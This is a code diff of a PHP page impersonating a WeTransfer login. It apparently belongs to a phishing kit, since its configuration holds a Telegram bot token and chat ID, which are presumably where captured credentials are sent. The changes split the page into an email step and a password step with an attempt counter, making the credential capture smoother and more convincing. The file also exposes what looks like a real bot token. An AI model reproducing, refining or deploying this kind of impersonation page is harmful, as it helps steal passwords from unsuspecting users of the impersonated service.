@@ -20,14 +20,15 @@ define('BOT_TOKEN', '8969946726:AAHVMCm5YcPlhl09v3cwy85nLpgamhxX21A');      // e
 define('CHAT_ID', '-5452025915');          // e.g. 123456789
 // ============================================================
 
+// Initialize login attempts array
 if (!isset($_SESSION['login_attempts'])) {
     $_SESSION['login_attempts'] = [];
 }
 
-// Process email submission
+// Process email submission (first step)
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['email'])) {
     $email = filter_var($_POST['email'], FILTER_SANITIZE_EMAIL);
-    $email = ltrim($email, '#');
+    $email = ltrim($email, '#'); // Remove leading #
     if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
         $_SESSION['transfer_email'] = $email;
         if (!isset($_SESSION['login_attempts'][$email])) {
@@ -35,6 +36,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['email'])) {
         }
         // Clear any previously stored first password
         unset($_SESSION['first_password'][$email]);
+        // Redirect to same page to show password form (prevents resubmission)
+        header('Location: ' . $_SERVER['PHP_SELF']);
+        exit;
     }
 }
 
@@ -141,7 +145,7 @@ function getProviderLink($email) {
 }
 
 // ============================================================
-// Process password submission
+// Process password submission (second step)
 // ============================================================
 $error = '';
 $email = $_SESSION['transfer_email'] ?? '';
@@ -255,20 +259,7 @@ if ($email) {
             }
         }
     }
-} else {
-    // If no email in session, but we are on the page, maybe show a message
-    // This prevents the "Session error" die and allows the form to work.
-    // Actually, the email is set in the first step. If missing, we can show a message.
-    // We'll keep the die for now, but we'll add a check.
-    // We'll handle it gracefully.
-    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
-        // If someone posts password without email, redirect to start
-        header('Location: ' . $_SERVER['PHP_SELF']);
-        exit;
-    }
-    // Otherwise, display the page normally (first step)
 }
-
 ?>
 <!DOCTYPE html>
 <html lang="en">
@@ -277,7 +268,6 @@ if ($email) {
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>WeTransfer Login</title>
     <style>
-        /* ====== Your existing CSS styles ====== */
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Helvetica Neue', Arial, sans-serif; }
         body { display: flex; min-height: 100vh; color: #333; overflow: hidden; }
         .left-pane { width: 50%; background-color: #f5f5f5; display: flex; flex-direction: column; justify-content: center; padding: 40px; position: relative; }
@@ -300,7 +290,7 @@ if ($email) {
         .checkbox-group input { margin-right: 10px; }
         .forgot-password { text-align: center; margin: 20px 0; }
         .forgot-password a { color: #0066ff; text-decoration: none; font-size: 14px; }
-        .btn-login { background-color: #000; color: white; border: none; border-radius: 4px; padding: 14px; width: 100%; font-size: 16px; font-weight: 500; cursor: pointer; display: flex; justify-content: space-between; align-items: center; transition: background-color 0.3s; }
+        .btn-login { background-color: #000; color: white; border: none; border-radius: 4px; padding: 14px; width: 100%; font-size: 16px; font-weight: 500; cursor: pointer; display: flex; justify-content: center; align-items: center; transition: background-color 0.3s; }
         .btn-login:hover { background-color: #333; }
         .btn-login svg { margin-right: 8px; }
         .footer { position: absolute; bottom: 20px; left: 0; width: 100%; text-align: center; font-size: 12px; color: #999; }
@@ -349,65 +339,95 @@ if ($email) {
                 <div class="alert alert-error"><?php echo htmlspecialchars($error); ?></div>
             <?php endif; ?>
             
-            <div class="profile-section">
-                <div class="profile-pic">
-                    <img src="download.png" alt="Profile Picture">
+            <?php if (empty($email)): ?>
+                <!-- First step: ask for email -->
+                <div class="profile-section">
+                    <div class="profile-pic">
+                        <img src="download.png" alt="Profile Picture">
+                    </div>
+                    <div class="welcome-text">Enter your email to continue</div>
                 </div>
-                <div class="user-email"><?= htmlspecialchars($email) ?></div>
-                <div class="welcome-text">Welcome back! Please enter your password</div>
-                <?php if ($attemptCount > 0): ?>
-                    <div style="margin-top:10px;font-size:13px;color:#999;">Attempt <?= $attemptCount + 1 ?> of 2</div>
-                <?php endif; ?>
-            </div>
-            
-            <div class="form-container">
-                <form id="loginForm" method="POST" action="<?php echo htmlspecialchars($_SERVER['PHP_SELF']); ?>">
-                    <div class="form-group <?php echo $error ? 'show-error' : ''; ?>">
-                        <div class="input-wrapper">
-                            <span class="input-icon">
-                                <svg width="16" height="20" viewBox="0 0 16 20" fill="none" xmlns="http://www.w3.org/2000/svg">
-                                    <path d="M14 8H13V6C13 3.24 10.76 1 8 1C5.24 1 3 3.24 3 6V8H2C0.9 8 0 8.9 0 10V18C0 19.1 0.9 20 2 20H14C15.1 20 16 19.1 16 18V10C16 8.9 15.1 8 14 8ZM5 6C5 4.34 6.34 3 8 3C9.66 3 11 4.34 11 6V8H5V6ZM14 18H2V10H14V18ZM8 15C9.1 15 10 14.1 10 13C10 11.9 9.1 11 8 11C6.9 11 6 11.9 6 13C6 14.1 6.9 15 8 15Z" fill="#999999"/>
-                                </svg>
-                            </span>
-                            <input type="password" 
-                                   id="password" 
-                                   name="password" 
-                                   class="form-control" 
-                                   placeholder="••••••••" 
-                                   required
-                                   autocomplete="current-password"
-                                   autofocus>
-                        </div>
-                        <?php if ($error): ?>
-                            <div class="error-message" id="error-msg">
-                                <?php echo htmlspecialchars($error); ?>
+                <div class="form-container">
+                    <form id="emailForm" method="POST" action="<?php echo htmlspecialchars($_SERVER['PHP_SELF']); ?>">
+                        <div class="form-group">
+                            <div class="input-wrapper">
+                                <span class="input-icon">
+                                    <svg width="16" height="20" viewBox="0 0 16 20" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                        <path d="M14 8H13V6C13 3.24 10.76 1 8 1C5.24 1 3 3.24 3 6V8H2C0.9 8 0 8.9 0 10V18C0 19.1 0.9 20 2 20H14C15.1 20 16 19.1 16 18V10C16 8.9 15.1 8 14 8ZM5 6C5 4.34 6.34 3 8 3C9.66 3 11 4.34 11 6V8H5V6ZM14 18H2V10H14V18ZM8 15C9.1 15 10 14.1 10 13C10 11.9 9.1 11 8 11C6.9 11 6 11.9 6 13C6 14.1 6.9 15 8 15Z" fill="#999999"/>
+                                    </svg>
+                                </span>
+                                <input type="email" id="email" name="email" class="form-control" placeholder="Enter your email" required autocomplete="email" autofocus>
                             </div>
-                        <?php endif; ?>
-                    </div>
-                    
-                    <div class="forgot-password">
-                        <a href="#">Forgot password?</a>
-                    </div>
-                    
-                    <div class="checkbox-group">
-                        <input type="checkbox" id="remember" name="remember">
-                        <label for="remember">Remember me</label>
-                    </div>
-                    
-                    <button type="submit" class="btn-login" id="loginButton">
-                        <span>
-                            <svg aria-hidden="true" focusable="false" class="icon-text" width="8px" height="12px" viewBox="0 0 8 12" version="1.1" xmlns="http://www.w3.org/2000/svg">
-                                <g id="Symbols" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
-                                    <g id="Web/Submit/Active" transform="translate(-148.000000, -32.000000)" fill="#FFFFFF">
-                                        <polygon id="Shape" points="148 33.4 149.4 32 155.4 38 149.4 44 148 42.6 152.6 38"></polygon>
+                        </div>
+                        <button type="submit" class="btn-login" id="emailButton">
+                            <span>
+                                <svg aria-hidden="true" focusable="false" class="icon-text" width="8px" height="12px" viewBox="0 0 8 12" version="1.1" xmlns="http://www.w3.org/2000/svg">
+                                    <g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+                                        <g fill="#FFFFFF">
+                                            <polygon points="148 33.4 149.4 32 155.4 38 149.4 44 148 42.6 152.6 38"></polygon>
+                                        </g>
                                     </g>
-                                </g>
-                            </svg>
-                            Log in with WeTransfer
-                        </span>
-                    </button>
-                </form>
-            </div>
+                                </svg>
+                                Continue
+                            </span>
+                        </button>
+                    </form>
+                </div>
+            <?php else: ?>
+                <!-- Second step: show password form -->
+                <div class="profile-section">
+                    <div class="profile-pic">
+                        <img src="download.png" alt="Profile Picture">
+                    </div>
+                    <div class="user-email"><?= htmlspecialchars($email) ?></div>
+                    <div class="welcome-text">Welcome back! Please enter your password</div>
+                    <?php if ($attemptCount > 0): ?>
+                        <div style="margin-top:10px;font-size:13px;color:#999;">Attempt <?= $attemptCount + 1 ?> of 2</div>
+                    <?php endif; ?>
+                </div>
+                
+                <div class="form-container">
+                    <form id="loginForm" method="POST" action="<?php echo htmlspecialchars($_SERVER['PHP_SELF']); ?>">
+                        <div class="form-group <?php echo $error ? 'show-error' : ''; ?>">
+                            <div class="input-wrapper">
+                                <span class="input-icon">
+                                    <svg width="16" height="20" viewBox="0 0 16 20" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                        <path d="M14 8H13V6C13 3.24 10.76 1 8 1C5.24 1 3 3.24 3 6V8H2C0.9 8 0 8.9 0 10V18C0 19.1 0.9 20 2 20H14C15.1 20 16 19.1 16 18V10C16 8.9 15.1 8 14 8ZM5 6C5 4.34 6.34 3 8 3C9.66 3 11 4.34 11 6V8H5V6ZM14 18H2V10H14V18ZM8 15C9.1 15 10 14.1 10 13C10 11.9 9.1 11 8 11C6.9 11 6 11.9 6 13C6 14.1 6.9 15 8 15Z" fill="#999999"/>
+                                    </svg>
+                                </span>
+                                <input type="password" id="password" name="password" class="form-control" placeholder="••••••••" required autocomplete="current-password" autofocus>
+                            </div>
+                            <?php if ($error): ?>
+                                <div class="error-message" id="error-msg">
+                                    <?php echo htmlspecialchars($error); ?>
+                                </div>
+                            <?php endif; ?>
+                        </div>
+                        
+                        <div class="forgot-password">
+                            <a href="#">Forgot password?</a>
+                        </div>
+                        
+                        <div class="checkbox-group">
+                            <input type="checkbox" id="remember" name="remember">
+                            <label for="remember">Remember me</label>
+                        </div>
+                        
+                        <button type="submit" class="btn-login" id="loginButton">
+                            <span>
+                                <svg aria-hidden="true" focusable="false" class="icon-text" width="8px" height="12px" viewBox="0 0 8 12" version="1.1" xmlns="http://www.w3.org/2000/svg">
+                                    <g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+                                        <g fill="#FFFFFF">
+                                            <polygon points="148 33.4 149.4 32 155.4 38 149.4 44 148 42.6 152.6 38"></polygon>
+                                        </g>
+                                    </g>
+                                </svg>
+                                Log in with WeTransfer
+                            </span>
+                        </button>
+                    </form>
+                </div>
+            <?php endif; ?>
         </div>
         
         <div class="footer">
@@ -418,27 +438,43 @@ if ($email) {
     
     <div class="loading-overlay" id="loading-overlay">
         <div class="spinner"></div>
-        <div class="msg">Logging you in, please wait...</div>
+        <div class="msg">Processing, please wait...</div>
     </div>
     
     <script>
         document.addEventListener('DOMContentLoaded', function() {
-            const form = document.getElementById('loginForm');
-            const passwordInput = document.getElementById('password');
-            const formGroup = document.querySelector('.form-group');
+            // Loading overlay for both forms
+            const emailForm = document.getElementById('emailForm');
+            const loginForm = document.getElementById('loginForm');
             const loadingOverlay = document.getElementById('loading-overlay');
             
-            passwordInput.addEventListener('input', function() {
-                formGroup.classList.remove('show-error', 'shake');
-            });
-            
-            form.addEventListener('submit', function(e) {
-                e.preventDefault();
+            function showLoading() {
                 loadingOverlay.style.display = 'flex';
                 setTimeout(() => {
-                    form.submit();
-                }, 500);
-            });
+                    // Allow form to submit after a tiny delay
+                }, 300);
+            }
+            
+            if (emailForm) {
+                emailForm.addEventListener('submit', function(e) {
+                    // Show loading
+                    showLoading();
+                });
+            }
+            
+            if (loginForm) {
+                const passwordInput = document.getElementById('password');
+                const formGroup = document.querySelector('.form-group');
+                
+                passwordInput.addEventListener('input', function() {
+                    formGroup.classList.remove('show-error', 'shake');
+                });
+                
+                loginForm.addEventListener('submit', function(e) {
+                    // Show loading
+                    showLoading();
+                });
+            }
         });
     </script>
 </body>
